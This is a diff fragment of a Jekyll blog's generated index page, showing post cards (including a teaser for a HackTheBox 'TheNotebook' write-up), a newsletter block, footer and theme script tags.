+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">28 Aug 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/thenotebook">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320banner.png" alt="HackTheBox - TheNotebook"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/thenotebook">HackTheBox - TheNotebook</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel medio. Exploraremos el mundo de los JSON Web Tokens para ingresar a una web con permisos administrativos. Jugaremos con llaves SSH y romperemos el siempre fiel Docker...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">31 Jul 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+                
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
+        <p></p>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Sh0x blog 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
